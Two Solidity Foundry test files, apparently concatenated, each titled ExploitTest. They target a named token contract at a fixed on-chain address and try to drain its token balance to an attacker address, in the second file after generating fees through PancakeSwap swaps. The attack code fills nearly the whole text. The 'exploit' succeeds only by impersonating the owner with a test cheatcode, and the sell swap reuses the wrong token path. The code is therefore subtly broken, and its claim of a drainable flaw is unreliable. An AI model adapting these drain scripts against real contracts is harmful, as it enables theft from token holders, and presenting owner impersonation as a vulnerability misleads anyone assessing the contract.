// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface xenoX {
    function owner() external view returns (address);
    function transferTokens(address recepient, uint256 amount) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use prank to impersonate owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51).balanceOf(address(this));
        // Get the current owner
        address owner = xenoX(TARGET).owner();

        // First, let's get some tokens to work with
        // The contract needs to have some balance for transferTokens to work
        // We'll transfer some tokens to the contract address
        uint256 initialAttackerBalance = IERC20(TARGET).balanceOf(attacker);

        // We need to have some tokens first - let's get some from the owner
        // Impersonate owner to transfer tokens to attacker
        vm.startPrank(owner);
        IERC20(TARGET).transfer(attacker, 1000000 * 10 ** 9);
        vm.stopPrank();

        // Now transfer some tokens to the contract to simulate fee accumulation
        vm.prank(attacker);
        IERC20(TARGET).transfer(TARGET, 500000 * 10 ** 9);

        // Check contract balance
        uint256 contractBalanceBefore = IERC20(TARGET).balanceOf(TARGET);
        console.log("Contract balance before exploit:", contractBalanceBefore);

        // Now exploit: impersonate owner and call transferTokens
        vm.startPrank(owner);
        xenoX(TARGET).transferTokens(attacker, contractBalanceBefore);
        vm.stopPrank();

        // Check balances after exploit
        uint256 contractBalanceAfter = IERC20(TARGET).balanceOf(TARGET);
        uint256 attackerBalanceAfter = IERC20(TARGET).balanceOf(attacker);

        console.log("Contract balance after exploit:", contractBalanceAfter);
        console.log("Attacker balance after exploit:", attackerBalanceAfter);
        console.log("Attacker balance before exploit:", initialAttackerBalance);

        // Verify exploit succeeded
        assertGt(attackerBalanceAfter, initialAttackerBalance, "Attacker balance should increase");
        assertEq(contractBalanceAfter, 0, "Contract should be drained");
        uint256 finalBalance = IERC20(0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface xenoX {
    function owner() external view returns (address);
    function transferTokens(address recepient, uint256 amount) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IPancakeRouter02 {
    function WETH() external pure returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use prank to impersonate owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the current owner
        address owner = xenoX(TARGET).owner();
        console.log("Owner address:", owner);

        // Check contract's current token balance
        uint256 contractBalanceBefore = IERC20(TARGET).balanceOf(TARGET);
        console.log("Contract token balance before:", contractBalanceBefore);

        // Check attacker's balance before
        uint256 attackerBalanceBefore = IERC20(TARGET).balanceOf(attacker);
        console.log("Attacker balance before:", attackerBalanceBefore);

        if (contractBalanceBefore > 0) {
            // Contract already has balance - directly drain it
            console.log("Contract has balance, draining...");
            vm.startPrank(owner);
            xenoX(TARGET).transferTokens(attacker, contractBalanceBefore);
            vm.stopPrank();
        } else {
            // Contract has no balance - we need to generate some fees first
            console.log("Contract has no balance, need to generate fees...");

            // We need some tokens to trade with first
            // Let's get a small amount from the owner
            vm.startPrank(owner);
            // Try a smaller amount that won't cause arithmetic issues
            xenoX(TARGET).transfer(attacker, 10000 * 10 ** 9); // 10,000 tokens
            vm.stopPrank();

            // Now we need to create a trade to generate fees
            // First, approve the router to spend our tokens
            address pancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
            vm.prank(attacker);
            IERC20(TARGET).approve(pancakeRouter, type(uint256).max);

            // We need some BNB to buy tokens
            deal(attacker, 1 ether);

            // Buy some tokens through PancakeSwap to generate fees
            address[] memory path = new address[](2);
            path[0] = IPancakeRouter02(pancakeRouter).WETH();
            path[1] = TARGET;

            vm.prank(attacker);
            IPancakeRouter02(pancakeRouter).swapExactETHForTokensSupportingFeeOnTransferTokens{
                value: 0.1 ether
            }(
                0, // amountOutMin
                path,
                attacker,
                block.timestamp + 3600
            );

            // Now sell some tokens to generate more fees (fees go to contract)
            uint256 sellAmount = IERC20(TARGET).balanceOf(attacker) / 2;

            vm.prank(attacker);
            IPancakeRouter02(pancakeRouter).swapExactTokensForETHSupportingFeeOnTransferTokens(
                sellAmount,
                0, // amountOutMin
                path,
                attacker,
                block.timestamp + 3600
            );

            // Check contract balance again
            contractBalanceBefore = IERC20(TARGET).balanceOf(TARGET);
            console.log("Contract balance after trades:", contractBalanceBefore);

            // Now drain the contract
            vm.startPrank(owner);
            xenoX(TARGET).transferTokens(attacker, contractBalanceBefore);
            vm.stopPrank();
        }

        // Check balances after exploit
        uint256 contractBalanceAfter = IERC20(TARGET).balanceOf(TARGET);
        uint256 attackerBalanceAfter = IERC20(TARGET).balanceOf(attacker);

        console.log("Contract balance after exploit:", contractBalanceAfter);
        console.log("Attacker balance after exploit:", attackerBalanceAfter);

        // Verify exploit succeeded
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker balance should increase");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

